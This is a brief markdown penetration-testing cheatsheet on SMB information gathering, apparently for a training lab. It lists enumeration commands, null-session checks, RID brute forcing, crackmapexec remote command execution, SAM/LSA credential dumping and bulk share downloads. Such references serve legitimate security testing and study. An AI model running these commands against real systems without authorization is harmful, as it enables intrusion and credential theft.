# Information Gathering Cheatsheet

## SMB

### Common Tools and Commands

Use nbtscan from [here](http://www.unixwiz.net/tools/nbtscan.html) instead of the version in Kali because of reasons.

```
enum4linux -a 10.11.1.136
nmblookup -A 10.11.1.136
smbclient //MOUNT/share -I 10.11.1.136 -N
smbclient -L //10.11.1.136
rpcclient -U "" 10.11.1.136
mount //10.11.1.5/share /mnt # Mount open shares
```

### Checking SMB Vulnerabilities

```
bash -c "nmap -p 139,445 --script=smb-vuln* 10.11.1.136"
```

### Check For Common SMB Issues

Null Sessions:
```
crackmapexec smb 10.11.1.136 -u '' -p '' --shares
```

RID Brute Forcing:

```
crackmapexec smb 10.11.1.136 -u '' -p '' --rid-brute
```

Code Execution:

```
crackmapexec smb 10.11.1.136 -u '' -p '' -x 'whoami'
```

Read SAM/LSA:

```
crackmapexec smb 10.11.1.136 -u '' -p '' --sam

crackmapexec smb 10.11.1.136 -u '' -p '' --lsa
```

Download Whole Share
```
smbclient '\\server\share'
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '/path/to/download/to/'
mget *
```

### Determine Remote SMB Version

```
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]'
smbclient -L //<IP>
```

## Coldfusion

Check [this](https://nets.ec/Coldfusion_hacking).

## Resources

[Penetration Testing Tools Cheat Sheet](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)
[HighOn.Coffee Nmap Cheatsheet](https://highon.coffee/blog/nmap-cheat-sheet/)
